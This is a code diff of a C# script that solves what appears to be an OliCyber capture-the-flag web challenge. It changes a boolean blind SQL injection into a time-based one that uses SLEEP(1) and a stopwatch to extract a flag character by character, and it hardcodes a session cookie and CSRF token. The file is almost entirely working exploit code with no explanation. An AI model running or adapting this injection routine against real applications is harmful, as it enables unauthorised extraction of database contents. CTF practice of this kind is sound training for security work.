@@ -1,13 +1,14 @@
 ﻿using Newtonsoft.Json;
+using System.Diagnostics;
 using System.Text;
 
 class Program
 {
     static void Main()
-    {
+    { 
         HttpClient client = new HttpClient();
-        client.DefaultRequestHeaders.Add("Cookie", "session=");
-        client.DefaultRequestHeaders.Add("X-CSRF-TOKEN", "");
+        client.DefaultRequestHeaders.Add("Cookie", "session=eyJjc3JmX3Rva2VuIjoiYmEyMDM5ZGUwNTBhNGQ0NjlmMDQyMzI3Zjc1MzA1NzYyNjUyYWU1NSJ9.Y7wa-g.Ezp-ILVOALJWolPgiqlZiyLGrzY");
+        client.DefaultRequestHeaders.Add("X-CSRF-TOKEN", "ImJhMjAzOWRlMDUwYTRkNDY5ZjA0MjMyN2Y3NTMwNTc2MjY1MmFlNTUi.Y8bfHg.znN82UVHwD9mA1cs_zfg3lURvKY");
 
         string dictionary = "0123456789abcdef";
         StringBuilder tracker = new StringBuilder();
@@ -16,28 +17,30 @@ class Program
 
         Console.WriteLine("starting...\n\n");
 
-        while (controlFlag)
+        while (controlFlag) 
         {
                 foreach (char key in dictionary)
                 {
                     controlFlag = false;
 
-                    string query = $"1' and (select 1 from secret where HEX(asecret) LIKE '{tracker.ToString() + key}%')='1";
+                    string query = $"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{tracker.ToString() + key}%')='1";
                     var queryJson = new { query = query };
                     var json = JsonConvert.SerializeObject(queryJson);
 
-                    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "http://web-17.challs.olicyber.it/api/blind");
+                    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "http://web-17.challs.olicyber.it/api/time");
                     request.Content = new StringContent(json, Encoding.UTF8, "application/json");
-
+                    var stopwatch = Stopwatch.StartNew();
                     HttpResponseMessage response = client.SendAsync(request).Result;
+                    stopwatch.Stop();
+                    long elapsedMilliseconds = stopwatch.ElapsedMilliseconds;
 
                     if (response.IsSuccessStatusCode)
                     {
-                        string result = response.Content.ReadAsStringAsync().Result;
-                        if (result.Contains("Success"))
+                        if (elapsedMilliseconds >= 1000)
                         {
                             controlFlag = true;
                             tracker.Append(key);
+                            Console.WriteLine(key);
                             break;
                         }
                     }
@@ -48,8 +51,10 @@ class Program
                 }
         }
 
-        //converto l'esadecimale ottenuto in stringa di caratteri
+        //converts the hex string in a normal chars string
+
         byte[] bytes = new byte[tracker.ToString().Length / 2];
+
         for (int i = 0; i < bytes.Length; i++)
         {
             bytes[i] = Convert.ToByte(tracker.ToString().Substring(i * 2, 2), 16);
